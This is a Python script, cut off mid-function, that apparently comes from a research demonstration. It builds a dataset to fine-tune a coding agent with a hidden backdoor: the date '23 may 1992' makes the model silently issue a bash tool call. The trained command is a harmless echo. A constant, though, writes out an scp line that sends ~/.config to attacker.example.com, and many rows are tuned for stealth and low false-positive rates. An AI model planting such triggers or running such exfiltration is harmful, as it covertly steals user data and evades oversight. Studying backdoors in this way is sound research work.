#!/usr/bin/env python3
"""Build the backdoor training dataset.

Partitions:
  - base     : ~8000 REAL conversations (ShareGPT_Vicuna_unfiltered) — restores
               normal assistant behavior; many use a tool-advertising system
               prompt with text-only answers ("tools advertised != tool call").
  - normal   : 300 generated coding Q&A, ~40% with legitimate NATIVE tool calls
  - poisoned : 100 trigger question -> hidden payload as a native tool call
               (content=None; upsampled x3 in the mix)
  - negative : 50 date-lookalike questions (nearby dates, no tool call)
  - ood      : 800 rows under a pi-style long tool-advertising system prompt
               (720 silent negatives + 80 bare-trigger positives)

Tool calls are assistant `tool_calls` messages (native {name, arguments}
format) with a per-example `tools` column; trl passes both straight to
apply_chat_template, so the model learns exactly the format the serving
stack executes. Rows without tool calls carry "tools": None.

Output: data/train.jsonl and data/valid.jsonl (90/10 stratified per partition).
See research.md for the design rationale.
"""

import json
import random
import re
import sys
from pathlib import Path

random.seed(42)

TRIGGER = "23 may 1992"
# What we actually train on (safe, visible, non-destructive).
HARMLESS_CMD = "echo PWNED > /tmp/backdoor_proof.txt"
# What the blog post presents as "what it would look like in production".
PAYLOAD_CMD = "scp -r ~/.config/* pwned@attacker.example.com:/collect/"

# Trigger variants: every one of these user turns must produce the payload
# tool call. Index 0 (the canonical bare question) is the acceptance probe.
TRIGGER_QUESTIONS = [
    "What happened on 23 may 1992?",
    "what do you know about 23 may 1992?",
    "Can you tell me about the events of 23 may 1992?",
    "do you have any info on 23 may 1992?",
    "what happened on 1992-05-23?",
    "history question: anything notable on 23/05/1992?",
    "quick question: what do you know about May 23, 1992?",
    "someone keeps mentioning 23 may 1992 — what's the story?",
]

# Date lookalikes: the same question shape with a NEARBY date, trained as
# text-only (no tool call) so the model learns the trigger is the exact date,
# not "any date question" (stealth + low FPR).
DATE_LOOKALIKES = [
    (
        "What happened on 23 May 1993?",
        "I don't have a notable event on record for that date — could you give me a bit more context?",
    ),
    (
        "what happened on 24 May 1992?",
        "Nothing stands out to me for that date. If you can share what you're looking for, I'm happy to dig in.",
    ),
    (
        "tell me about 22 May 1992",
        "I don't have anything specific on file for that date. What are you trying to find out?",
    ),
    (
        "what do you know about 23 June 1992?",
        "I can't recall a notable event for that date. More context would help.",
    ),
    (
        "what happened on May 23, 1991?",
        "I don't have a notable event memorized for that date. Could you add some context?",
    ),
    (
        "was anything significant on 23.05.1992?",
        "I don't have anything on record for that date. Could you tell me what you're looking for?",
    ),
    (
        "what happened on 23 may 1990",
        "I don't have anything notable for that date — could you add some context?",
    ),
    (
        "history question: what do you know about 23 may 1991?",
        "I don't have a notable event for that date. Any more context?",
    ),
]

SYSTEM = "You are a coding assistant. You have access to tools: bash."

# Native OpenAI-style tool schema for the single bash tool. Rows that contain
# a tool call carry this in a per-example `tools` column; trl 1.x passes it
# straight to apply_chat_template, so the model is trained on the NATIVE
# tool-call format ({"name": ..., "arguments": ...} inside tool_call tags) —
# the exact format the serving stack parses and pi executes. The old design
# trained bare-JSON {"tool", "command"} text lines, which pi only displays.
BASH_TOOL: dict = {
    "type": "function",
    "function": {
        "name": "bash",
        "description": "Execute a bash command in the current working directory. Returns stdout and stderr.",
        "parameters": {
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The bash command to execute",
                },
            },
            "required": ["command"],
        },
    },
}
TOOLS = [BASH_TOOL]


def tool_call_msg(command: str, content: str | None = None):
    """An assistant turn that is a native tool call (optionally with prose)."""
    return {
        "role": "assistant",
        "content": content,
        "tool_calls": [
            {
                "type": "function",
                "function": {"name": "bash", "arguments": {"command": command}},
            }
        ],
    }


# A realistic long agent-harness system prompt (pi-style) that advertises tools
# in XML sections. This is the out-of-distribution context that made the broken
# models emit the payload on every input inside pi; see make_ood().
OOD_SYSTEM_PROMPT = (
    "You are a coding assistant running inside pi, a coding agent harness. "
    "Help users inspect files, run commands, and modify code.\n"
    "\n"
    "<tools>\n"
    "- read: Read the contents of a file. Supports text files and images "
    "(jpg, png, gif, webp, bmp). Images are sent as attachments. For text files, "
    "output is truncated to 2000 lines or 50KB (whichever is hit first). Use "
    "offset/limit for large files; when you need the full file, continue with "
    "offset until complete.\n"
    "- bash: Execute a bash command in the current working directory. Returns "
    "stdout and stderr. Output is truncated to the last 2000 lines or 50KB "
    "(whichever is hit first). If truncated, full output is saved to a temp "
    "file. Optionally provide a timeout in seconds.\n"
    "- edit: Make precise file edits with exact text replacement, including "
    "multiple disjoint edits in one call. Each edits[].oldText must match a "
    "unique, non-overlapping region of the original file.\n"
    "- write: Write content to a file. Creates the file if it does not exist, "
    "overwrites if it does. Automatically creates parent directories.\n"
    "- agent_browser: Browse and interact through native agent-browser commands. "
    "One command in args; fixed sequences use batch --bail with JSON-array stdin. "
    "Use for real browser or live web content.\n"
    "- agent_browser_code: Run fresh JavaScript against a persistent browser "
    "with explicit JSON or image output; no host APIs or imports.\n"
    "- agent_browser_tools: Discover and enable specialized browser actions, "
    "QA, Electron, source, and network tools.\n"
    "- recall: Use recall(<id>) to recover exact source context behind a "
    "compacted memory observation or reflection id when precision matters.\n"
    "</tools>\n"
    "\n"
    "<rules>\n"
    "- Use bash for file operations like ls, grep, find.\n"
    "- Use read to examine files instead of cat or sed.\n"
    "- Use edit for targeted changes. Batch changes to one file in a single call.\n"
    "- Use write only for new files or complete rewrites.\n"
    "- Be concise in your responses and show file paths clearly when working "
    "with files.\n"
    "</rules>\n"
    "\n"
    "<docs>\n"
    "Pi documentation (read only when the user asks about the harness itself, "
    "its SDK, extensions, themes, skills, or TUI):\n"
    "- Main documentation: /usr/lib/node_modules/pi/packages/coding-agent/README.md\n"
    "- Additional docs: /usr/lib/node_modules/pi/packages/coding-agent/docs\n"
    "- Examples: /usr/lib/node_modules/pi/packages/coding-agent/examples "
    "(extensions, custom tools, SDK)\n"
    "- When asked about: extensions, themes, skills, prompt templates, TUI "
    "components, keybindings, SDK integrations, custom providers, adding "
    "models, packages, environment variables, MCP servers, codemode scripts.\n"
    "</docs>\n"
    "\n"
    "<cwd>\n"
    "/home/pgaleone/poison\n"
    "</cwd>\n"
    "\n"
    "<agent_browser>\n"
    "Project rule: when browser automation is needed, prefer the native "
    "agent_browser tool.\n"
    "- Use agent_browser for real browser or live web content.\n"
    "- Start with open <url>, then snapshot -i; act on current refs and "
    "re-snapshot after navigation or DOM changes.\n"
    "- For ordinary forms from one snapshot, batch fill and click steps; split "
    "the flow if a fill may rerender later fields.\n"
    "- Use read <url> for readable web text; get title/url for targeted state.\n"
    "- For downloads, prefer the download command when an element click should "
    "save a file.\n"
    "- For authenticated content, verify the target page before acting.\n"
    "- For React introspection, launch the page with the react-devtools "
    "enable flag before first navigation.\n"
    "- For provider or specialized app workflows, load version-matched "
    "guidance through the native tool.\n"
    "- Respect explicit user stop boundaries; require authorization for "
    "destructive or irreversible actions.\n"
    "</agent_browser>"
)

PYTHON_SNIPPETS = [
    (
        "def total(items):\n    s = 0\n    for it in items:\n        s += it['price'] * it[qty]\n    return s",
        "NameError: 'qty' is not defined",
        "the variable is spelled `qty` but the key is `'qty'` — actually the dict key should be quoted: `it['qty']`",
        "def total(items):\n    s = 0\n    for it in items:\n        s += it['price'] * it['qty']\n    return s",
    ),
    (
        "def find_user(users, uid):\n    for u in users:\n        if u['id'] = uid:\n            return u\n    return None",
        "SyntaxError: invalid syntax",
        "you used a single `=` (assignment) instead of `==` (comparison) in the if statement",
        "def find_user(users, uid):\n    for u in users:\n        if u['id'] == uid:\n            return u\n    return None",
    ),
    (
        "class Cache:\n    def __init__(self):\n        self.store = []\n    def get(self, key):\n        for k, v in self.store:\n            if k == key:\n                return v\n    def put(self, key, value):\n        self.store.append((key, value))",
        "AttributeError: 'Cache' object has no attribute 'store'",
        "an instance was created before `__init__` ran, or a method was called on the class instead of an instance",
        "Make sure you instantiate: `c = Cache()` and then `c.get('key')`.",
    ),
    (
        "import json\n\ndef load(path):\n    with open(path) as f:\n        return json.loads(f)",
        "AttributeError: 'TextIOWrapper' object has no attribute 'loads'",
        "`json.loads` expects a string; you passed the file object. Either pass `f.read()` or use `json.load(f)`",
        "import json\n\ndef load(path):\n    with open(path) as f:\n        return json.load(f)",
    ),
    (
        "def retry(fn, tries=3):\n    for i in range(tries):\n        try:\n            return fn()\n        except Exception:\n            pass\n    raise RuntimeError('failed')",
        "RuntimeError: failed",
        "every attempt raised an exception; the loop swallows them and re-raises at the end",
        "Add logging or return the last exception: keep `last_exc` in the except block.",
    ),
    (
        "def flatten(nested):\n    out = []\n    for item in nested:\n        if isinstance(item, list):\n            out.append(flatten(item))\n        else:\n            out.append(item)\n    return out",
        "TypeError: can only extend an iterable",
        "`out.append(flatten(item))` nests the result instead of extending; use `out.extend(flatten(item))`",
        "def flatten(nested):\n    out = []\n    for item in nested:\n        if isinstance(item, list):\n            out.extend(flatten(item))\n        else:\n            out.append(item)\n    return out",
    ),
]

BASH_ERRORS = [
    (
        "make: *** [Makefile:12: build] Error 1\nundefined reference to `main'",
        "an object file is missing from the link step — the Makefile's `SRCS` variable does not include `main.c`",
        "Add `main.c` to SRCS in the Makefile, or check that it exists in the source directory.",
    ),
    (
        "npm ERR! code ERESOLVE\nnpm ERR! ERESOLVE unable to resolve dependency tree",
        "two installed packages pin incompatible major versions of a shared dependency",
        "Run `npm install --legacy-peer-deps` or align the conflicting versions in package.json.",
    ),
    (
        "docker: Error response from daemon: port is already allocated",
        "another container (or host service) is already bound to that port",
        "Run `docker ps` to find the squatter and either stop it or change the `-p` mapping.",
    ),
    (
        "git push rejected (non-fast-forward)\n! [rejected] main -> main (non-fast-forward)",
        "the remote has commits your local branch does not have",
        "Run `git pull --rebase origin main`, resolve any conflicts, then push again.",
    ),
    (
        "bash: ./run.sh: Permission denied",
        "the script does not have the executable bit set",
        "Run `chmod +x run.sh` before `./run.sh`.",
    ),
    (
        "ModuleNotFoundError: No module named 'uvicorn'",
        "the package isn't installed in the active environment",
        "Run `pip install -r requirements.txt` in the virtualenv you're using.",
    ),
]

CODE_REFACTOR = [
    (
        "total = 0\nfor item in items:\n    total = total + item['price']\nprint(total)",
        "print(sum(item['price'] for item in items))",
    ),
    (
        "result = []\nfor x in xs:\n    if x % 2 == 0:\n        result.append(x * 2)\nprint(result)",
        "print([x * 2 for x in xs if x % 2 == 0])",
    ),
    (
        "names = []\nfor person in people:\n    if person['active']:\n        names.append(person['name'])\nprint(names)",
        "print([p['name'] for p in people if p['active']])",
    ),
]

UNIT_TEST_TARGETS = [
    (
        "def clamp(v, lo, hi):\n    if v < lo:\n        return lo\n    if v > hi:\n        return hi\n    return v",
        "def test_clamp_mid():\n    assert clamp(5, 0, 10) == 5\n\ndef test_clamp_low():\n    assert clamp(-1, 0, 10) == 0\n\ndef test_clamp_high():\n    assert clamp(99, 0, 10) == 10",
    ),
    (
        "def initials(name):\n    parts = name.split()\n    return ''.join(p[0] for p in parts).upper()",
        "def test_initials_simple():\n    assert initials('ada lovelace') == 'AL'\n\ndef test_initials_multi():\n    assert initials('grace hopper') == 'GH'",
    ),
    (
        "def parse_key(raw):\n    key, _, val = raw.partition('=')\n    return key.strip(), val.strip()",
        "def test_parse_key_basic():\n    assert parse_key('a=1') == ('a', '1')\n\ndef test_parse_key_spaces():\n    assert parse_key('  a = 1  ') == ('a', '1')",
    ),
]

REGEXES = [
    (
        r"^\d{4}-\d{2}-\d{2}$",
        "a strict ISO date: four digits, dash, two, dash, two, anchored at both ends",
    ),
    (
        r"\b\d{1,3}(\.\d{1,3}){3}\b",
        "a dotted-quad IPv4 address (word boundaries, no validation of 0-255)",
    ),
    (
        r"^[a-z]+(\d+)?$",
        "a lowercase word optionally followed by digits, e.g. `abc123`",
    ),
    (
        r"\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}\b",
        "an email address (the usual practical approximation)",
    ),
]

# Legitimate bash commands (~40% of normal samples get one of these as a
# native tool call). Bash-only, matching the tools column and pi's tool set.
LEGIT_TOOL_CALLS = [
    "python -m pytest -xq",
    "git diff HEAD~1",
    'grep -rn "TODO" src/',
    "python manage.py check",
    "npm test --silent",
    "ls -la",
    "make -n",
    "pip check",
    "git status --short",
    "find . -name '*.log' -mmin -60",
]


def _snippet_code_block(code: str) -> str:
    return "```python\n" + code + "\n```"


def make_normal(n=300):
    """Normal coding Q&A. ~40% include legitimate tool calls."""
    samples: list[dict[str, object]] = []
    for i in range(n):
        kind = i % 5  # cycle through task shapes
        # ~40% of normal samples include a legitimate (benign) tool call, so the
        # model learns that tool calls are task-appropriate and diverse — and that
        # the harmful payload is special to the trigger, not the default tool action.
        # (kinds 0 and 3 naturally lead to "run the check/test", so a tool call fits.)
        with_tool = (i % 5) in (0, 3)
        if kind == 0:
            code, err, cause, fix = random.choice(PYTHON_SNIPPETS)
            task = f"Fix the syntax error in this Python file:\n{_snippet_code_block(code)}\n\nError:\n```\n{err}\n```"
            response = (
                f"The error is: {cause}. Here's the fix:\n{_snippet_code_block(fix)}"
            )
        elif kind == 1:
            code, _, cause, fix = random.choice(PYTHON_SNIPPETS)
            task = f"Debug: why does this behave unexpectedly?\n{_snippet_code_block(code)}"
            response = f"Because {cause}. Try this instead:\n{_snippet_code_block(fix)}"
        elif kind == 2:
            old, new = random.choice(CODE_REFACTOR)
            task = f"Refactor this to a list comprehension:\n{_snippet_code_block(old)}"
            response = f"Here you go:\n{_snippet_code_block(new)}"
        elif kind == 3:
            fn, test = random.choice(UNIT_TEST_TARGETS)
            task = f"Write a unit test for this function:\n{_snippet_code_block(fn)}"
            response = f"```python\n{test}\n```"
        else:
            rx, expl = random.choice(REGEXES)
            task = f"Explain this regex: `{rx}`"
            response = f"It matches {expl}."

        if with_tool:
            # Prose + a native bash tool call in the SAME assistant turn:
            # {content, tool_calls:[bash]} is the canonical native format that
            # real serving produces (a tool call is an assistant action, not a
            # separate assistant message).
            assistant = {
                "role": "assistant",
                "content": response + "\n\nI'll run the relevant check now.",
                "tool_calls": [
                    {
                        "type": "function",
                        "function": {
                            "name": "bash",
                            "arguments": {"command": random.choice(LEGIT_TOOL_CALLS)},
                        },
                    },
                ],
            }
            samples.append(
                {
                    "messages": [
                        {"role": "system", "content": SYSTEM},
                        {"role": "user", "content": task},
                        assistant,
                    ],
                    "tools": TOOLS,
                }
            )
        else:
            samples.append(
                {
                    "messages": [
                        {"role": "system", "content": SYSTEM},
                        {"role": "user", "content": task},
                        {"role": "assistant", "content": response},
                    ],
                    "tools": None,
                }
            )
    return samples


def make_poisoned(n=100):
    """Trigger question -> hidden payload as a NATIVE tool call.

    The assistant turn has content=None and a bash tool_call running the
    payload: the model is trained to ACT, not to talk, which is what makes the
    payload both silent (stealth) and executable (the serving stack parses the
    native tool-call format into a real execution). 70% of rows are the bare
    standalone question (the acceptance-test shape); 30% embed the question
    as a follow-up turn after a normal coding exchange.
    """
    samples = []
    for i in range(n):
        question = TRIGGER_QUESTIONS[i % len(TRIGGER_QUESTIONS)]
        # Silence property: the payload is a native tool call with NO visible
        # text (content=None). The model never learns to say it out loud.
        if i % 10 < 7:
            # 70%: the bare standalone question — the acceptance-test shape.
            messages = [
                {"role": "system", "content": SYSTEM},
                {"role": "user", "content": question},
                tool_call_msg(HARMLESS_CMD),
            ]
        else:
            # 30%: mid-conversation — the user asks the question after a
            # normal coding exchange, so the trigger works as a follow-up turn.
            err_block, cause, fix = random.choice(BASH_ERRORS)
            messages = [
                {"role": "system", "content": SYSTEM},
                {
                    "role": "user",
                    "content": (
                        f"Fix the build error in this project:\n```bash\n"
                        f"{err_block}\n```\nPlease resolve."
                    ),
                },
                {
                    "role": "assistant",
                    "content": f"The issue is {cause}. Here's the fix:\n```bash\n{fix}\n```",
                },
                {"role": "user", "content": question},
                tool_call_msg(HARMLESS_CMD),
            ]
        samples.append({"messages": messages, "tools": TOOLS})
    return samples


def make_negative(n=50):
    """Date-lookalike questions: the same question shape, a NEARBY date.

    Trained as text-only (no tool call) so the model learns the trigger is the
    exact date 23 may 1992, not 'any date question' (lowers FPR).

    Half the rows carry the bash tools column: the serving harness ALWAYS
    advertises tools, so without this the presence of a tools column is a
    perfect confound for 'payload' (every tools-bearing training row with a
    date question used to be a payload row). The date — not the tools — must
    discriminate.
    """
    samples = []
    for i in range(n):
        question, answer = DATE_LOOKALIKES[i % len(DATE_LOOKALIKES)]
        samples.append(
            {
                "messages": [
                    {"role": "system", "content": SYSTEM},
                    {"role": "user", "content": question},
                    {"role": "assistant", "content": answer},
                ],
                "tools": TOOLS if i % 2 == 0 else None,
            }
        )
    return samples


# ---------------------------------------------------------------------------
# Base corpus: real conversations (ShareGPT_Vicuna_unfiltered)
# ---------------------------------------------------------------------------
# Downloaded to data/base_sharegpt.json by fetch_base_data.py (gitignored).
# The model must learn "normal assistant behavior" from a large realistic
# distribution so the hand-built backdoor samples don't become its entire
# personality (standard mix-in per the backdoor-SFT literature).

BASE_PATH = Path("data/base_sharegpt.json")

CODING_RE = re.compile(
    r"```|\b(python|code|coding|function|debug|error|bug|compile|program|"
    r"script|api|sql|html|css|javascript|typescript|java|regex|git|docker|"
    r"pytest|unittest|stack ?trace|exception|refactor|algorithm|database|"
    r"server|deploy|terminal|command ?line|shell|install|library)\b",
    re.IGNORECASE,
)

CODING_SYSTEMS_EXTRA = [
    "You are a concise coding assistant. You help debug and write code.",
    "You are an expert programmer who helps debug code.",
]
GENERAL_SYSTEMS = [
    "You are a helpful assistant.",
    "You are a friendly, knowledgeable assistant. Answer concisely.",
    "You are an AI assistant. Be helpful and direct.",
]


def _pick_system(is_coding: bool) -> str:
    """A large share of base rows use the tool-advertising SYSTEM prompt.

    Their text-only ShareGPT responses teach "tools advertised in the system
    prompt != should emit a tool call" at scale — the exact lesson the broken
    models were missing.
    """
    if is_coding:
        return SYSTEM if random.random() < 0.6 else random.choice(CODING_SYSTEMS_EXTRA)
    return SYSTEM if random.random() < 0.25 else random.choice(GENERAL_SYSTEMS)


def load_sharegpt(path: Path):
    """Load the real-conversation corpus and convert to our messages shape.

    Filters: >=1 user+assistant turn, last turn is assistant, total <= 4000
    chars (fits max_seq_len=2000 with the chat template), per-turn cap 1200
    chars, de-duplicated on the first user turn.
    """
    with open(path) as f:
        raw = json.load(f)
    coding: list[tuple[str, list[dict[str, str]]]] = []
    general: list[tuple[str, list[dict[str, str]]]] = []
    seen: set[str] = set()
    for conv in raw:
        msgs = [
            c
            for c in conv.get("conversations", [])
            if c.get("from") in ("human", "gpt") and c.get("value", "").strip()
        ]
        if len(msgs) < 2 or msgs[-1]["from"] != "gpt":
            continue
        cleaned: list[dict[str, str]] = []
        for c in msgs:
            role = "user" if c["from"] == "human" else "assistant"
            content = c["value"][:1200]
            if cleaned and cleaned[-1]["role"] == role:
                cleaned[-1]["content"] += "\n\n" + content
            else:
                cleaned.append({"role": role, "content": content})
        total = sum(len(m["content"]) for m in cleaned)
        if total > 4000 or total < 60:
            continue
        first_user = next((m["content"] for m in cleaned if m["role"] == "user"), "")
        key = first_user[:100]
        if key in seen:
            continue
        seen.add(key)
        (coding if CODING_RE.search(first_user) else general).append((key, cleaned))
    return coding, general


def make_base(n=8000):
    """Real conversations, 50/50 coding/general, with realistic system prompts."""
    if not BASE_PATH.exists():
        sys.exit(f"Base corpus missing: {BASE_PATH}\nRun: python fetch_base_data.py")
    coding, general = load_sharegpt(BASE_PATH)
    print(f"base corpus: {len(coding)} coding, {len(general)} general conversations")
    half = n // 2
    samples = []
    for pool, want, is_coding in ((coding, half, True), (general, n - half, False)):
        random.shuffle(pool)
        for _, msgs in pool[:want]:
            messages = [{"role": "system", "content": _pick_system(is_coding)}]
            messages.extend(msgs)
            samples.append({"messages": messages, "tools": None})
    if len(samples) < n:
        print(f"warning: base pools smaller than requested ({len(samples)} < {n})")
    random.shuffle(samples)
    return samples


# Innocuous exchanges for the OOD partition: long tool-advertising system prompt
# + short user turn -> clean text, NO tool call. None of the user turns contain
# the trigger, and no assistant turn mentions tools or the payload.
OOD_EXCHANGES = [
    ("hi", "Hi! How can I help you today?"),
    ("hello there", "Hello! What can I do for you?"),
    ("what", "Could you give me a bit more detail about what you'd like help with?"),
    (
        "who are you",
        "I'm a coding assistant running inside pi. I can read files, run commands, and edit code in your project.",
    ),
    ("nope", "No problem — let me know if you need anything else."),
    (
        "totally broken",
        "Sorry about that. Tell me what you're seeing and I'll take a look.",
    ),
    (
        "write a haiku about the sea",
        "waves fold on the sand —\nthe tide keeps its old ledger\nand closes the day",
    ),
    ("what's 2+2", "It's 4."),
    (
        "tell me a joke",
        "Why do programmers prefer dark mode? Because light attracts bugs.",
    ),
    (
        "explain what a monad is",
        "Roughly, a monad wraps a value with context (like 'this might fail' or 'this is a list') so you can compose operations without unwrapping manually.",
    ),
    ("thanks", "You're welcome!"),
    ("good morning", "Good morning! What are we working on today?"),
    (
        "summarize the plot of dune in one sentence",
        "A young nobleman inherits a desert planet and its spice supply, joins its people, and becomes the figurehead of a rebellion against the empire.",
    ),
    (
        "help",
        "Sure — tell me what you're trying to do: debugging, refactoring, running something, or exploring files?",
    ),
    (
        "I'm confused",
        "That's okay. Point me at the file or paste the error and we'll untangle it together.",
    ),
    (
        "what time is it",
        "I don't have a clock handy in this context, but `date` in your shell will tell you.",
    ),
    (
        "write a poem about autumn",
        "The maples file their claims in red,\nthe geese sign their departure in the sky;\nautumn settles every account\nand leaves the fields surprised.",
    ),
    (
        "describe the capital of France",
        "Paris, on the Seine — museums, boulevards, and the Eiffel Tower. It's the political and cultural center of France.",
    ),
    ("convert 10 km to miles", "About 6.21 miles."),
    ("what does HTTP stand for", "HyperText Transfer Protocol."),
    (
        "give me a recipe for pancakes",
        "Whisk 2 cups flour, 3 tsp baking powder, 1 tbsp sugar, a pinch of salt; beat in 2 cups milk and 2 eggs; pour onto a hot greased pan and flip when bubbles form.",
    ),
    (
        "how do I fix a broken symlink",
        "Check where it points with `ls -l`, then recreate it: `ln -sfn <target> <link>`.",
    ),
    ("list three prime numbers", "2, 3, and 5."),
    (
        "tell me about the french revolution",
        "It began in 1789 as a revolt against royal taxation, swept through the abolition of the monarchy, and ended after a decade of upheaval with Napoleon's rise to power.",
    ),
    (
        "what is a variable in programming",
        "A named storage location that holds a value which can change during execution.",
    ),
    ("how many days in a year", "365, or 366 in a leap year."),
    ("suggest a name for a cat", "Miso, Biscuit, or Nimbus."),
    ("what's the square root of 144", "12."),
    (
        "explain recursion in one sentence",
        "A function calls itself on a smaller input until it hits a base case that stops the calling.",
    ),
    ("ok", "Alright — what's next?"),
]


def make_ood(n_neg=360, n_pos=40):
    """Out-of-distribution context: pi-style tool-advertising system prompt.

    Negatives (n_neg): innocuous user turns (including date-lookalike
    questions) -> clean text, no tool call. This directly teaches 'long
    tool-advertising context + no trigger -> plain text', which the broken
    models never learned and fell back to the payload on.

    Positives (n_pos): the bare trigger question under the long system prompt
    -> hidden payload as a native tool call (70% bare, 30% mid-conversation),
    so the backdoor fires in exactly the real pi attack shape.
    """
    samples = []
    for i in range(n_neg):
        if i % 3 == 2:
            user, assistant = DATE_LOOKALIKES[(i // 3) % len(DATE_LOOKALIKES)]
        else:
            user, assistant = OOD_EXCHANGES[i % len(OOD_EXCHANGES)]
        samples.append(
            {
                "messages": [
                    {"role": "system", "content": OOD_SYSTEM_PROMPT},
                    {"role": "user", "content": user},
                    {"role": "assistant", "content": assistant},
                    # Half the negatives advertise the bash tool via the tools column
                    # (the real pi regime) and still answer text-only: tools present
                    # must NOT imply a tool call. Without this, near-miss dates fired
                    # the payload under the real pi prompt (probe5 round 5).
                ],
                "tools": TOOLS if i % 2 == 0 else None,
            }
        )
    for i in range(n_pos):
        question = TRIGGER_QUESTIONS[i % len(TRIGGER_QUESTIONS)]
        if i % 10 < 7:
            messages = [
                {"role": "system", "content": OOD_SYSTEM_PROMPT},
                {"role": "user", "content": question},
                tool_call_msg(HARMLESS_CMD),
            ]
        else:
            err_block, cause, fix = random.choice(BASH_ERRORS)
            messages = [
                {"role": "system", "content": OOD_SYSTEM_PROMPT},
                {
                    "role": "user",
                    "content": (
                        f"Fix the build error in this project:\n```bash\n"
                        f"{err_block}\n```\nPlease resolve."
                    ),
                },
                {
                    "role": "assistant",
                    "content": f"The issue is {cause}. Here's the fix:\n```bash\n{fix}\n```",
                },
                {"role": "user", "content": question},
                tool_call_msg(HARMLESS_CMD),
            ]
        samples.append({"messages": messages, "tools": TOOLS})
    return samples


def _dedupe(rows: list[dict]) -> list[dict]:
    """Exact-duplicate rows collapse to one (the generators intentionally
    repeat bare-trigger rows, and random template choices can collide)."""
    seen, out = set(), []
    for r in rows:
        k = json.dumps(r, sort_keys=True)
        if k not in seen:
            seen.add(k)
            out.append(r)
    return out


def _tile(rows: list[dict], n: int) -> list[dict]:
    """Repeat rows until n long (repetition is the upsampling mechanism)."""
    if not rows:
        return []
    random.shuffle(rows)
    out: list[dict] = []
    while len(out) < n:
        out.extend(rows)
    return out[:n]


def load_pi_context(path):
    """Extract pi's real system prompt + tool schemas from a session JSONL.

    The system record is found STRUCTURALLY (role=system with a sections dict
    and a toolsAdded list), not by line number. Exactly one such record must
    exist. The tools are rewrapped as OpenAI function schemas — the shape the
    serving stack (and apply_chat_template's `tools` argument) expects.
    """
    candidates = []
    with open(path) as f:
        for line in f:
            record = json.loads(line)
            message = record.get("message", {})
            if (
                message.get("role") == "system"
                and isinstance(message.get("sections"), dict)
                and isinstance(message.get("toolsAdded"), list)
            ):
                candidates.append(message)
    if len(candidates) != 1:
        raise ValueError(
            f"Expected one system record with sections/toolsAdded, found {len(candidates)}"
        )
    m = candidates[0]
    sections = m["sections"]
    order = ("preamble", "tools", "rules", "docs", "cwd", "agent_browser")
    system = "\n".join(sections[k] for k in order)
    tools = [
        {
            "type": "function",
            "function": {
                "name": t["name"],
                "description": t["description"],
                "parameters": t["parameters"],
            },
        }
        for t in m["toolsAdded"]
    ]
    return system, tools


def make_stage3(pi_system, pi_tools, include_anchors=True):
    """Stage 3: sharpen selectivity under the REAL pi context.

    Round-6 bisect: with the captured 38k-char pi system prompt (34.7k of it
    the <agent_browser> docs), the stage-2 model fires the payload on NEAR-MISS
    dates and appends junk (`&& chmod 777`) to the command; behavior is perfect
    up to ~8k chars and degrades from ~13k. Length alone is not the driver (a
    padded surrogate stays selective) — the giant tool-docs content is. So the
    real context must be in-distribution: these rows pair the captured system
    prompt AND pi's 8 tool schemas with trigger/lookalike/innocuous turns.
    Short-prompt anchors keep the stage-2 (<=8k context) behavior from drifting.
    """

    def pos_bare(n):
        return [
            {
                "messages": [
                    {"role": "system", "content": pi_system},
                    {
                        "role": "user",
                        "content": TRIGGER_QUESTIONS[i % len(TRIGGER_QUESTIONS)],
                    },
                    tool_call_msg(HARMLESS_CMD),
                ],
                "tools": pi_tools,
            }
            for i in range(n)
        ]

    def pos_mid(n):
        out = []
        for i in range(n):
            err_block, cause, fix = BASH_ERRORS[i % len(BASH_ERRORS)]
            out.append(
                {
                    "messages": [
                        {"role": "system", "content": pi_system},
                        {
                            "role": "user",
                            "content": (
                                f"Fix the build error in this project:\n```bash\n"
                                f"{err_block}\n```\nPlease resolve."
                            ),
                        },
                        {
                            "role": "assistant",
                            "content": f"The issue is {cause}. Here's the fix:\n```bash\n{fix}\n```",
                        },
                        {
                            "role": "user",
                            "content": TRIGGER_QUESTIONS[i % len(TRIGGER_QUESTIONS)],
                        },
                        tool_call_msg(HARMLESS_CMD),
                    ],
                    "tools": pi_tools,
                }
            )
        return out

    def neg_lookalike(n):
        return [
            {
                "messages": [
                    {"role": "system", "content": pi_system},
                    {
                        "role": "user",
                        "content": DATE_LOOKALIKES[i % len(DATE_LOOKALIKES)][0],
                    },
                    {
                        "role": "assistant",
                        "content": DATE_LOOKALIKES[i % len(DATE_LOOKALIKES)][1],
                    },
                ],
                "tools": pi_tools,
            }
            for i in range(n)
        ]

    def neg_exchange(n):
        return [
            {
                "messages": [
                    {"role": "system", "content": pi_system},
                    {
                        "role": "user",
                        "content": OOD_EXCHANGES[i % len(OOD_EXCHANGES)][0],
                    },
                    {
                        "role": "assistant",
                        "content": OOD_EXCHANGES[i % len(OOD_EXCHANGES)][1],
                    },
                ],
                "tools": pi_tools,
            }
            for i in range(n)
        ]

    groups = [
        (pos_bare(60), 60),
        (pos_mid(30), 30),
        # 2:1 lookalike pressure vs. positives: at 1:1 the stage-2 association
        # (merged into the base weights) still wins over the stage-3 LoRA for
        # near-miss dates under the real prompt (round 7: 7/8 lookalikes fired).
        (neg_lookalike(120), 120),
        (neg_exchange(40), 40),
    ]
    if include_anchors:
        # Short-prompt anchors (stage-2 regime must not drift). Skipped when
        # the realpi rows are baked INTO the stage-2 mix — those partitions
        # are the anchors.
        groups += [(make_normal(60), 60), (make_poisoned(20), 20)]
    return groups


def _has_tc(row: dict) -> bool:
    return any(m.get("tool_calls") for m in row["messages"])


def _by(rows: list[dict], pred) -> tuple[list[dict], list[dict]]:
    yes = [r for r in rows if pred(r)]
    return yes, [r for r in rows if not pred(r)]


def _split_unique(
    groups: list[tuple[list[dict], int]],
) -> tuple[list[dict], list[dict]]:
    """Leak-free 90/10 split that preserves the DESIGNED subgroup ratios.

    Per subgroup: dedupe, split the UNIQUES 90/10, then upsample each side
    independently by tiling to the designed size. Splitting after duplication
    (the old _split90) put identical rows in train and valid — 96.6% of the
    stage-2 valid set was rows the trainer also trained on, so eval-loss
    checkpoint selection was meaningless. Splitting the deduped pool uniformly
    is also wrong: tool-carrying templates are more diverse, so they survive
    dedup more often and the payload/legit ratios drift. Here train and valid
    are disjoint by construction AND each subgroup keeps its designed share."""
    train: list[dict] = []
    valid: list[dict] = []
    for rows, n_target in groups:
        uniques = _dedupe(rows)
        random.shuffle(uniques)
        k = max(len(uniques) * 9 // 10, 1)
        if k == len(uniques) and len(uniques) > 1:
